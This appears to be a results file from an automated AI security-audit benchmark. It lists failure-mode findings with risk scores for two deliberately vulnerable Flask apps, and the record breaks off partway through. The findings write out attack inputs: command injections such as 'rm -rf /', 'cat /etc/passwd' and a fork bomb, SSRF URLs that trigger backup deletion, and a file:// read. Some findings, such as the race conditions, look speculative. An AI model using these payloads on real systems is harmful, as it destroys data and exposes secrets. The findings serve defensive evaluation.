@@ -1,0 +1,2556 @@
+{
+  "meta": {
+    "label": "rerun2-main-cap7",
+    "model": "mistral-medium-latest",
+    "reasoning": "off",
+    "runs": 3,
+    "created": "2026-11-21T23:36:00",
+    "git": {
+      "commit": "787925937f1865dcc9ba087ba8e53e0160a252e1",
+      "dirty": true
+    },
+    "signed_off": {
+      "adversarial-api": "Prashant Nehe (2026-11-09)",
+      "chain-api": "Prashant Nehe (2026-11-09)",
+      "infra-deploy": "Prashant Nehe (2026-11-09)",
+      "notes-express": "Prashant Nehe (2026-11-09)",
+      "shop-api": "Prashant Nehe (2026-11-09)",
+      "web-templates": "Prashant Nehe (2026-11-09)"
+    },
+    "max_usd": 3.1,
+    "max_failure_modes": 7,
+    "stopped": null,
+    "total_cost_usd": 3.1579
+  },
+  "repos": {
+    "adversarial-api": {
+      "runs": [
+        {
+          "findings": [
+            {
+              "failure_mode": "Arbitrary Command Injection via /ping endpoint",
+              "trigger": "Single crafted HTTP request to /ping with a malicious 'host' parameter (e.g., /ping?host=;rm -rf /).",
+              "evidence": "app.py:15-16: 'host = request.args.get(\"host\", \"localhost\")', 'subprocess.run(f\"ping -c 1 {host}\", shell=True, ...)'",
+              "business_impact": "Full host compromise via remote code execution. Operations staff lose control of the system; attackers can exfiltrate data, install malware, or pivot to adjacent systems.",
+              "blast_radius": "Entire host system (Tier 1) and any connected networks or services accessible from the compromised host.",
+              "attack_chain": [
+                "Attacker sends HTTP GET request to /ping with crafted 'host' parameter containing command injection payload (e.g., host=;id)",
+                "Flask app (app.py:15) extracts untrusted 'host' from request.args without validation",
+                "subprocess.run (app.py:16) executes the payload with shell=True, allowing arbitrary OS command execution"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "SSRF (Server-Side Request Forgery) via /ping endpoint",
+              "trigger": "HTTP request to /ping with 'host' set to an internal or external target (e.g., /ping?host=169.254.169.254).",
+              "evidence": "app.py:15-16: Unvalidated 'host' parameter passed directly to shell command.",
+              "business_impact": "Internal network reconnaissance or attacks on internal services (e.g., cloud metadata APIs, databases). Business operations may be disrupted, and sensitive data could be exposed.",
+              "blast_radius": "Internal network and any services reachable from the host (e.g., cloud metadata, databases, other Tier 1/2 systems).",
+              "attack_chain": [
+                "Attacker sends HTTP GET request to /ping with 'host' parameter set to an internal IP or sensitive endpoint (e.g., host=169.254.169.254)",
+                "Flask app passes the unvalidated 'host' to subprocess.run (app.py:16)",
+                "The ping command attempts to connect to the attacker-specified host, potentially leaking internal network data or triggering unintended actions"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Debug Mode Exposure (RCE via Flask Debug Pin)",
+              "trigger": "Network access to the Flask debug interface (default port 5000) and exploitation of the debug pin.",
+              "evidence": "app.py:21: 'app.run(host=\"0.0.0.0\", debug=True)'",
+              "business_impact": "Full remote code execution on the host, enabling complete system takeover. Operations staff and customers are at risk of data theft or service disruption.",
+              "blast_radius": "Entire host system (Tier 1) and any adjacent systems accessible from the compromised host.",
+              "attack_chain": [
+                "Flask app runs with debug=True on all interfaces (app.py:21)",
+                "Attacker connects to the debug interface (typically port 5000) and exploits the debug pin to execute arbitrary Python code",
+                "Debug pin can often be brute-forced or derived from weak entropy (e.g., machine-specific values)"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 6,
+              "rpn": 420,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service (DoS) via Command Execution",
+              "trigger": "High-volume requests to /ping with malicious or slow 'host' values (e.g., /ping?host=10.0.0.1).",
+              "evidence": "app.py:16: 'subprocess.run(...)' with no timeout or resource limits.",
+              "business_impact": "Diagnostics API (and potentially the entire host) becomes unavailable, disrupting support staff operations and any dependent services.",
+              "blast_radius": "Tier 1 (Flask app and /ping endpoint) and any services relying on it. May cascade to adjacent systems if shared resources are exhausted.",
+              "attack_chain": [
+                "Attacker sends repeated requests to /ping with 'host' set to a non-existent or slow-responding target (e.g., host=10.0.0.1)",
+                "Each request spawns a subprocess.run (app.py:16) that hangs or consumes resources waiting for a response",
+                "Flask app (Tier 1) becomes unresponsive due to exhausted process/thread pools or CPU/memory saturation"
+              ],
+              "severity": 8,
+              "occurrence": 7,
+              "detection": 5,
+              "rpn": 280,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via Command Output",
+              "trigger": "Single HTTP request to /ping with a 'host' parameter containing a command that outputs sensitive data (e.g., /ping?host=;cat /etc/passwd).",
+              "evidence": "app.py:16-17: 'subprocess.run(...)' and 'return out.stdout' without sanitization.",
+              "business_impact": "Exposure of sensitive system or application data (e.g., credentials, configuration files). Harms the business by enabling further attacks or compliance violations.",
+              "blast_radius": "Confidential data on the host system (Tier 1) and any secrets or configurations stored there.",
+              "attack_chain": [
+                "Attacker sends request to /ping with 'host' set to a command that leaks sensitive data (e.g., host=;cat /etc/passwd)",
+                "subprocess.run (app.py:16) executes the command, and the output (stdout) is returned directly to the attacker via the HTTP response",
+                "Sensitive files, environment variables, or system information are exposed"
+              ],
+              "severity": 8,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 448,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race Condition in Subprocess Execution (TOCTOU)",
+              "trigger": "Concurrent HTTP requests to /ping with rapidly changing 'host' parameters, exploiting race conditions in request processing.",
+              "evidence": "app.py:15-16: No synchronization or validation between reading 'host' and executing the command.",
+              "business_impact": "Unpredictable command execution or data corruption. May lead to partial system compromise or erratic behavior, harming operations staff.",
+              "blast_radius": "Tier 1 (Flask app and subprocess execution). Limited to the host but could cause instability.",
+              "attack_chain": [
+                "Attacker sends rapid, concurrent requests to /ping with alternating 'host' values (e.g., benign then malicious)",
+                "Flask app (app.py:15) reads 'host' from request.args, but subprocess.run (app.py:16) may execute a stale or overwritten value due to race conditions in request handling",
+                "If the host system has shared state (e.g., temporary files), TOCTOU could lead to unintended command execution"
+              ],
+              "severity": 6,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 270,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Cascading Failure via Unhandled Exceptions",
+              "trigger": "Malformed 'host' parameter causing subprocess.run to fail (e.g., /ping?host=;).",
+              "evidence": "app.py:16-17: No exception handling around subprocess.run or the /ping endpoint.",
+              "business_impact": "Diagnostics API becomes unavailable, disrupting support staff's ability to troubleshoot. May expose sensitive debug information.",
+              "blast_radius": "Tier 1 (Flask app and /ping endpoint). If debug=True is enabled, stack traces may leak additional system details.",
+              "attack_chain": [
+                "Attacker sends malformed input to /ping (e.g., host with special characters that break the ping command)",
+                "subprocess.run (app.py:16) fails with an exception (e.g., OSError), which is unhandled by the Flask app",
+                "Flask app crashes (debug=True may expose stack traces), taking down the entire diagnostics API (Tier 1)"
+              ],
+              "severity": 7,
+              "occurrence": 6,
+              "detection": 4,
+              "rpn": 168,
+              "priority": "Medium",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.170218,
+          "seconds": 152.0,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "Arbitrary Command Injection via /ping Endpoint",
+              "trigger": "Crafted HTTP GET request to /ping with a host parameter containing shell metacharacters (e.g., ;, |, &&).",
+              "evidence": "app.py:15-16: host = request.args.get(\"host\", \"localhost\"); out = subprocess.run(f\"ping -c 1 {host}\", shell=True, ...)",
+              "business_impact": "Full system compromise of the host running the diagnostics API. Support staff operations disrupted, sensitive data (logs, configs) exposed or destroyed. Lateral movement possible if host has network access to other systems.",
+              "blast_radius": "Complete host takeover; potential pivot to adjacent systems if credentials or network access are available.",
+              "attack_chain": [
+                "Attacker sends HTTP GET request to /ping with malicious 'host' parameter (e.g., host=; rm -rf /)",
+                "Flask app (app.py:15) extracts untrusted 'host' from request.args without validation",
+                "subprocess.run (app.py:16) executes the crafted payload with shell=True, enabling command injection",
+                "Underlying OS executes the injected command with the Flask process's privileges"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Remote Code Execution via Debug Mode",
+              "trigger": "Network access to the Flask app (default port 5000) while debug=True is enabled.",
+              "evidence": "app.py:21: app.run(host=\"0.0.0.0\", debug=True)",
+              "business_impact": "Complete compromise of the diagnostics service and host. Operations staff lose trust in diagnostic tools; potential data exfiltration or sabotage.",
+              "blast_radius": "Full host compromise; debug mode may expose memory contents (e.g., environment variables, secrets).",
+              "attack_chain": [
+                "Flask app runs in debug mode (app.py:21) bound to 0.0.0.0 (all interfaces)",
+                "Attacker exploits debug mode's built-in interactive debugger (e.g., via /console or pin-based access)",
+                "Debugger allows arbitrary Python code execution on the server",
+                "Attacker gains full control over the Flask process and underlying system"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via Command Injection",
+              "trigger": "Crafted /ping request with a host parameter containing a fork bomb or infinite loop command.",
+              "evidence": "app.py:16: subprocess.run(f\"ping -c 1 {host}\", shell=True, ...)",
+              "business_impact": "Diagnostics API becomes unresponsive, blocking support staff from troubleshooting. Operational downtime for dependent teams.",
+              "blast_radius": "Host instability; may affect other services running on the same machine.",
+              "attack_chain": [
+                "Attacker sends /ping request with host parameter triggering resource exhaustion (e.g., host=; :(){ :|:& };:)",
+                "subprocess.run (app.py:16) executes the fork bomb or CPU-intensive command",
+                "System resources (CPU, memory) are exhausted, crashing the Flask app or host OS"
+              ],
+              "severity": 8,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 392,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via Command Output",
+              "trigger": "Crafted /ping request with host parameter containing commands like cat, env, or ls.",
+              "evidence": "app.py:16-17: subprocess.run(...); return out.stdout",
+              "business_impact": "Exposure of system secrets (passwords, API keys), user data, or configuration files. Compliance violations (e.g., GDPR, HIPAA) if PII is leaked.",
+              "blast_radius": "Sensitive data from the host is exposed; may enable further attacks (e.g., credential reuse).",
+              "attack_chain": [
+                "Attacker sends /ping request with host parameter designed to leak sensitive data (e.g., host=; cat /etc/passwd)",
+                "subprocess.run (app.py:16) executes the command and captures stdout",
+                "Flask returns the command output (app.py:17) to the attacker, exposing sensitive files or environment variables"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 6,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "TOCTOU Race Condition in Host Parameter Processing",
+              "trigger": "Concurrent HTTP requests to /ping with rapidly changing host parameters (e.g., via automated tool).",
+              "evidence": "app.py:15-16: host = request.args.get(...); subprocess.run(...)",
+              "business_impact": "Intermittent command injection, leading to unpredictable system behavior. Hard to detect and debug, causing sporadic outages or data corruption.",
+              "blast_radius": "Host compromise during race window; may go unnoticed until exploited.",
+              "attack_chain": [
+                "Attacker sends rapid /ping requests with alternating benign and malicious host parameters",
+                "Flask's request handling (app.py:15) reads request.args.get(\"host\") without locking",
+                "subprocess.run (app.py:16) may execute a malicious host value due to race condition in parameter processing",
+                "Command injection succeeds if the malicious value is processed during the TOCTOU window"
+              ],
+              "severity": 7,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 315,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Cascading Failure via Subprocess Crash",
+              "trigger": "Crafted /ping request with host parameter that kills the subprocess or parent process.",
+              "evidence": "app.py:16: subprocess.run(...) (no error handling)",
+              "business_impact": "Diagnostics API becomes unavailable, hindering support staff's ability to troubleshoot network issues. Operational blind spots.",
+              "blast_radius": "Full service outage; may require manual restart, causing extended downtime.",
+              "attack_chain": [
+                "Attacker sends /ping request with host parameter causing subprocess to crash (e.g., host=; kill -9 1)",
+                "subprocess.run (app.py:16) fails, but Flask does not handle the exception (no try/except)",
+                "Flask app crashes, taking down the entire diagnostics service",
+                "Dependent systems (e.g., monitoring dashboards) lose access to ping functionality"
+              ],
+              "severity": 7,
+              "occurrence": 6,
+              "detection": 5,
+              "rpn": 210,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Network Scanning and Lateral Movement Enablement",
+              "trigger": "Sequential /ping requests with host parameters scanning IP ranges (e.g., 192.168.1.1-254).",
+              "evidence": "app.py:16: subprocess.run(f\"ping -c 1 {host}\", ...)",
+              "business_impact": "Internal network reconnaissance enables targeted attacks on backend systems. Potential breach of databases, admin panels, or other sensitive services.",
+              "blast_radius": "Exposes internal network structure; may lead to compromise of adjacent systems.",
+              "attack_chain": [
+                "Attacker sends /ping requests with host parameters targeting internal IPs (e.g., host=192.168.1.1)",
+                "subprocess.run (app.py:16) executes ping against internal hosts, revealing network topology",
+                "Attacker maps internal network, identifies live hosts, and targets them for further attacks",
+                "If firewall rules allow, attacker may pivot to other systems using exposed services"
+              ],
+              "severity": 8,
+              "occurrence": 7,
+              "detection": 6,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.16826,
+          "seconds": 114.6,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "Remote Command Execution via Shell Injection",
+              "trigger": "HTTP GET request to /ping with a host parameter containing shell metacharacters (e.g., ;, |, &&, or newlines) to inject arbitrary commands.",
+              "evidence": "app.py:15-16: 'host = request.args.get(\"host\", \"localhost\")', 'subprocess.run(f\"ping -c 1 {host}\", shell=True, ...)'",
+              "business_impact": "Complete host compromise; attacker gains full control over the server, enabling data exfiltration, service disruption, or lateral movement to adjacent systems. Operations staff and customers are at risk of data breaches or service outages.",
+              "blast_radius": "Entire host system and any connected networks or services accessible from the compromised host. Potential for full infrastructure takeover if lateral movement is possible.",
+              "attack_chain": [
+                "Attacker sends HTTP GET request to /ping with malicious 'host' parameter (e.g., host=; rm -rf /)",
+                "Flask app (app.py:15) extracts untrusted 'host' from request.args without validation",
+                "subprocess.run (app.py:16) executes the crafted command with shell=True, allowing arbitrary shell command execution"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 1.0
+            },
+            {
+              "failure_mode": "Denial of Service via Command Injection",
+              "trigger": "HTTP GET request to /ping with host parameter containing a resource-exhausting payload (e.g., fork bomb, infinite loop).",
+              "evidence": "app.py:16: 'subprocess.run(f\"ping -c 1 {host}\", shell=True, ...)'",
+              "business_impact": "Diagnostics service becomes unresponsive, affecting support staff's ability to troubleshoot network issues. Prolonged outage may impact customer support operations and business reputation.",
+              "blast_radius": "Host system becomes unstable or crashes, potentially affecting other services running on the same machine.",
+              "attack_chain": [
+                "Attacker sends HTTP GET request to /ping with host parameter set to a command that consumes resources (e.g., host=; :(){ :|:& };:)",
+                "Flask app passes the input directly to subprocess.run with shell=True (app.py:16)",
+                "The fork bomb or resource-intensive command executes, exhausting system CPU/memory"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 392,
+              "priority": "High",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Information Disclosure via Command Injection",
+              "trigger": "HTTP GET request to /ping with host parameter containing commands that read sensitive files (e.g., /etc/passwd, /etc/shadow, environment variables).",
+              "evidence": "app.py:16: 'subprocess.run(f\"ping -c 1 {host}\", shell=True, capture_output=True, text=True)'",
+              "business_impact": "Exposure of sensitive system information (e.g., user accounts, configuration files, or secrets) to unauthorized parties. Compliance violations and reputational damage may occur.",
+              "blast_radius": "Confidential data on the host system is exposed, potentially leading to further attacks or regulatory penalties.",
+              "attack_chain": [
+                "Attacker sends HTTP GET request to /ping with host parameter set to a command that leaks sensitive data (e.g., host=; cat /etc/passwd)",
+                "subprocess.run (app.py:16) executes the command with shell=True, returning the output in the HTTP response",
+                "Sensitive system files or environment variables are exposed in the response"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 1.0
+            },
+            {
+              "failure_mode": "Debug Mode Information Leak",
+              "trigger": "Any request that causes an unhandled exception (e.g., malformed input, missing parameters) while debug mode is enabled.",
+              "evidence": "app.py:21: 'app.run(host=\"0.0.0.0\", debug=True)'",
+              "business_impact": "Attackers gain insights into the application's internal workings, aiding in further exploitation. Sensitive implementation details are exposed, increasing the risk of targeted attacks.",
+              "blast_radius": "Limited to the Flask app itself, but the leaked information can be used to craft more sophisticated attacks against the host or other services.",
+              "attack_chain": [
+                "Flask app runs in debug mode (app.py:21), exposing detailed error pages and stack traces",
+                "Attacker sends malformed requests to trigger exceptions (e.g., invalid host parameter)",
+                "Debug mode returns internal server details, including code snippets, environment variables, and file paths"
+              ],
+              "severity": 7,
+              "occurrence": 5,
+              "detection": 4,
+              "rpn": 140,
+              "priority": "Medium",
+              "validator_confidence": 0.9
+            },
+            {
+              "failure_mode": "Network Exposure via Binding to 0.0.0.0",
+              "trigger": "Service startup with host=\"0.0.0.0\" configuration, combined with network connectivity to the server.",
+              "evidence": "app.py:21: 'app.run(host=\"0.0.0.0\", debug=True)'",
+              "business_impact": "Increased attack surface; the service is exposed to potential attackers beyond the intended internal network. Risk of unauthorized access and exploitation from external networks.",
+              "blast_radius": "The /ping endpoint is accessible to any host that can reach the server, amplifying the impact of other vulnerabilities (e.g., command injection).",
+              "attack_chain": [
+                "Flask app binds to 0.0.0.0 (app.py:21), making the /ping endpoint accessible from any network interface",
+                "Attackers on the same network or the internet (if firewall permits) can send crafted requests to the endpoint",
+                "Combined with the command injection vulnerability, this allows remote attackers to exploit the service"
+              ],
+              "severity": 6,
+              "occurrence": 6,
+              "detection": 6,
+              "rpn": 216,
+              "priority": "High",
+              "validator_confidence": 0.85
+            },
+            {
+              "failure_mode": "Race Condition in Subprocess Execution",
+              "trigger": "High-frequency concurrent requests to /ping with varying host parameters, exploiting Flask's default single-threaded mode.",
+              "evidence": "app.py:16: 'subprocess.run(...)' (no explicit concurrency controls)",
+              "business_impact": "Unpredictable behavior, potential command output mixing, or resource exhaustion. Support staff may receive incorrect or corrupted diagnostic results, leading to misdiagnosis.",
+              "blast_radius": "Limited to the subprocess executions and their outputs, but could cause instability or incorrect results in the diagnostics service.",
+              "attack_chain": [
+                "Attacker sends rapid, concurrent requests to /ping with different host parameters",
+                "Flask's single-threaded nature (default) may lead to overlapping subprocess executions (app.py:16)",
+                "Race condition in subprocess resource handling (e.g., file descriptors, PID reuse) could cause unintended command execution or output leakage"
+              ],
+              "severity": 3,
+              "occurrence": 2,
+              "detection": 9,
+              "rpn": 54,
+              "priority": "Medium",
+              "validator_confidence": 0.3
+            },
+            {
+              "failure_mode": "Cascading Failure via Unhandled Subprocess Errors",
+              "trigger": "Request to /ping with a host parameter that causes the ping command to fail (e.g., invalid hostname, unreachable IP, or long timeout).",
+              "evidence": "app.py:16-17: 'subprocess.run(...)' followed by 'return out.stdout' (no error handling)",
+              "business_impact": "Diagnostics service appears broken or unreliable to support staff, reducing their ability to troubleshoot network issues. Customer support operations are degraded.",
+              "blast_radius": "Limited to the /ping endpoint, but repeated failures may cause support staff to lose trust in the tool, leading to manual workarounds.",
+              "attack_chain": [
+                "Attacker sends a request with a host parameter that causes subprocess.run to fail (e.g., host=nonexistent_host_with_long_timeout)",
+                "subprocess.run (app.py:16) may hang or fail silently, returning no output or partial output",
+                "Flask app does not handle subprocess errors (e.g., timeouts, non-zero exit codes), leading to uninformative responses or crashes"
+              ],
+              "severity": 5,
+              "occurrence": 7,
+              "detection": 5,
+              "rpn": 175,
+              "priority": "Medium",
+              "validator_confidence": 0.9
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.151664,
+          "seconds": 96.2,
+          "llm_calls": 14
+        }
+      ]
+    },
+    "chain-api": {
+      "runs": [
+        {
+          "findings": [
+            {
+              "failure_mode": "Arbitrary File Deletion via Unauthenticated Admin Endpoint",
+              "trigger": "Unauthenticated HTTP GET request to /wipe-backups on localhost:9000, either directly from host or via SSRF through public.py /preview endpoint.",
+              "evidence": "internal_admin.py:9-11 ('@admin.get(\"/wipe-backups\")', 'shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)'), internal_admin.py:6 ('Listens on 127.0.0.1:9000'), public.py:9-10 ('url = request.args[\"url\"]', 'resp = requests.get(url, timeout=5)')",
+              "business_impact": "Permanent loss of all shop backups, disrupting disaster recovery. Operations staff cannot restore critical data. Business faces downtime and potential data loss.",
+              "blast_radius": "Host-local (direct file system impact). If /var/backups/shop contains symlinks or misconfigured paths, deletion could extend to other directories. Lateral movement not required but pivot from public.py via SSRF enables this.",
+              "attack_chain": [
+                "Attacker sends HTTP GET request to localhost:9000/wipe-backups from the same host (or via SSRF from public.py)",
+                "internal_admin.py receives request at /wipe-backups (path:internal_admin.py:9)",
+                "shutil.rmtree executes on /var/backups/shop (path:internal_admin.py:11) with no auth check",
+                "All files under /var/backups/shop are recursively deleted"
+              ],
+              "severity": 9,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 648,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Server-Side Request Forgery (SSRF) to Internal Services",
+              "trigger": "HTTP GET request to /preview with url parameter set to localhost:9000/wipe-backups or other internal endpoints.",
+              "evidence": "public.py:9-10 ('url = request.args[\"url\"]', 'resp = requests.get(url, timeout=5)'), internal_admin.py:9-11 ('/wipe-backups', 'shutil.rmtree(...)')",
+              "business_impact": "Unauthenticated attacker triggers backup deletion via public endpoint. Business loses backup integrity, operations staff face recovery failure.",
+              "blast_radius": "Host-local file system corruption. SSRF enables pivot from public-facing service to internal admin service on same host.",
+              "attack_chain": [
+                "Attacker sends crafted request to /preview?url=http://127.0.0.1:9000/wipe-backups",
+                "public.py fetches the URL using requests.get (path:public.py:10)",
+                "Request reaches internal_admin.py /wipe-backups endpoint (path:internal_admin.py:9)",
+                "shutil.rmtree executes, deleting /var/backups/shop (path:internal_admin.py:11)"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Arbitrary Outbound Data Exfiltration via /preview",
+              "trigger": "HTTP GET request to /preview with url parameter pointing to attacker-controlled server or internal service with sensitive data.",
+              "evidence": "public.py:9-11 ('url = request.args[\"url\"]', 'resp = requests.get(url, timeout=5)', 'return resp.text[:2000]')",
+              "business_impact": "Sensitive internal data (e.g., config files, logs, or credentials) may be leaked to external attacker. Customers and business reputation at risk.",
+              "blast_radius": "External data exposure. If internal services are reachable via SSRF, their responses may be leaked.",
+              "attack_chain": [
+                "Attacker sends request to /preview?url=http://attacker.com/steal-data",
+                "public.py fetches the URL (path:public.py:10) and returns first 2000 chars of response (path:public.py:11)",
+                "If the attacker controls the external URL, they can serve content that leaks internal data (e.g., via error messages, timing, or reflected content)",
+                "Attacker captures the response, which may include sensitive data from internal services if SSRF is combined with misconfigurations"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 441,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via Outbound Request Flood",
+              "trigger": "High-volume requests to /preview with URLs that cause slow or hanging responses (e.g., slowloris, blackhole IPs).",
+              "evidence": "public.py:10 ('resp = requests.get(url, timeout=5)')",
+              "business_impact": "Public service (link preview) becomes unavailable, degrading user experience. Customers cannot generate previews, harming engagement.",
+              "blast_radius": "Service-specific (public.py only). No direct impact on internal_admin.py, but shared host resources (CPU, network) may degrade both services.",
+              "attack_chain": [
+                "Attacker sends rapid, concurrent requests to /preview?url=http://slow-target.com or non-existent URLs",
+                "public.py spawns multiple outbound requests (path:public.py:10) with timeout=5",
+                "Server exhausts file descriptors, memory, or network bandwidth waiting for slow responses",
+                "Flask app becomes unresponsive, affecting all /preview requests"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 6,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Path Traversal via Malicious URL in /preview",
+              "trigger": "HTTP GET request to /preview with url parameter set to file:///path/to/sensitive/file.",
+              "evidence": "public.py:9-11 ('url = request.args[\"url\"]', 'resp = requests.get(url, timeout=5)', 'return resp.text[:2000]')",
+              "business_impact": "Sensitive system files (e.g., /etc/passwd, config files) are leaked to attacker. Operations staff credentials or system details exposed.",
+              "blast_radius": "Host-local file read access. If file:// is allowed, attacker can read any file accessible to the Flask process.",
+              "attack_chain": [
+                "Attacker sends request to /preview?url=file:///etc/passwd",
+                "public.py passes url to requests.get (path:public.py:10)",
+                "requests library may follow file:// URLs (depending on version/config), returning local file contents",
+                "First 2000 chars of file are returned to attacker (path:public.py:11)"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 441,
+              "priority": "Critical",
+              "validator_confidence": 0.85
+            },
+            {
+              "failure_mode": "Race Condition in Backup Deletion (TOCTOU)",
+              "trigger": "Concurrent execution of backup writes and /wipe-backups requests (via SSRF or direct localhost access).",
+              "evidence": "internal_admin.py:11 ('shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)')",
+              "business_impact": "Partial or corrupted backups. Operations staff may restore incomplete data, leading to data loss or corruption.",
+              "blast_radius": "Host-local (backup directory only). No lateral movement, but critical data integrity is compromised.",
+              "attack_chain": [
+                "Attacker triggers /wipe-backups via SSRF (e.g., /preview?url=http://127.0.0.1:9000/wipe-backups)",
+                "Between the request initiation and shutil.rmtree execution (path:internal_admin.py:11), a backup process writes new files to /var/backups/shop",
+                "shutil.rmtree deletes the directory, including newly written backups, leading to inconsistent state"
+              ],
+              "severity": 8,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 360,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Cascading Failure from public.py Crash",
+              "trigger": "Requests to /preview with URLs that cause long hangs or resource exhaustion (e.g., slow responses, infinite loops).",
+              "evidence": "public.py:10 ('resp = requests.get(url, timeout=5)'), system cartography ('Both services run on the same host')",
+              "business_impact": "Both public and internal services may become unavailable. Customers lose preview functionality; operations staff lose admin access.",
+              "blast_radius": "Host-wide (both services on same host). Shared resource exhaustion affects all Tier 1 services.",
+              "attack_chain": [
+                "Attacker sends request to /preview?url=http://malicious.com/hang (a server that never responds)",
+                "public.py hangs on requests.get (path:public.py:10) due to timeout=5 not being enforced strictly (or network issues)",
+                "Multiple such requests exhaust Flask worker threads",
+                "Flask app (public.py) becomes unresponsive, and if shared resources (e.g., memory) are exhausted, internal_admin.py may also crash"
+              ],
+              "severity": 8,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 392,
+              "priority": "High",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.18129,
+          "seconds": 114.3,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "SSRF to internal_admin.py leading to backup deletion",
+              "trigger": "Single HTTP GET request to /preview?url=http://127.0.0.1:9000/wipe-backups from any external source",
+              "evidence": "public.py:9 ('url = request.args[\"url\"]'), public.py:10 ('resp = requests.get(url, timeout=5)'), internal_admin.py:6 ('Listens on 127.0.0.1:9000'), internal_admin.py:9-12 ('@admin.get(\"/wipe-backups\") ... shutil.rmtree(\"/var/backups/shop\")'), internal_admin.py:9-12 ('No authentication/authorization')",
+              "business_impact": "Complete loss of shop backups causing business stoppage, affecting all customers and operations. Irrecoverable data loss if no offsite backups exist.",
+              "blast_radius": "Direct deletion of Tier 1 critical data store (/var/backups/shop). No lateral movement needed as both services are co-located.",
+              "attack_chain": [
+                "Attacker sends crafted request to /preview endpoint with url=http://127.0.0.1:9000/wipe-backups",
+                "public.py makes outbound HTTP request to internal_admin.py (localhost:9000)",
+                "internal_admin.py receives unauthenticated request and executes shutil.rmtree('/var/backups/shop')",
+                "Critical backup directory /var/backups/shop is deleted"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 8,
+              "rpn": 640,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Arbitrary file deletion via path traversal in wipe-backups",
+              "trigger": "Modified request to /wipe-backups with path=/ (or similar) from localhost",
+              "evidence": "internal_admin.py:11 ('shutil.rmtree(\"/var/backups/shop\", ignore_errors=True)'), internal_admin.py:9-12 ('No authentication/authorization')",
+              "business_impact": "Potential deletion of any system files, leading to service outages, data corruption, or complete host compromise. Affects all services on the host.",
+              "blast_radius": "Entire host filesystem if path traversal is possible (though current code hardcodes path, modification would enable this).",
+              "attack_chain": [
+                "Attacker with localhost access (e.g., via SSRF or host compromise) calls /wipe-backups with modified path parameter",
+                "internal_admin.py blindly passes path to shutil.rmtree without validation",
+                "Arbitrary files/directories on the host are deleted"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 490,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information disclosure via SSRF to internal services",
+              "trigger": "HTTP GET request to /preview?url=http://127.0.0.1:9000/ from external source",
+              "evidence": "public.py:9 ('url = request.args[\"url\"]'), public.py:10 ('resp = requests.get(url, timeout=5)'), public.py:11 ('return resp.text[:2000]')",
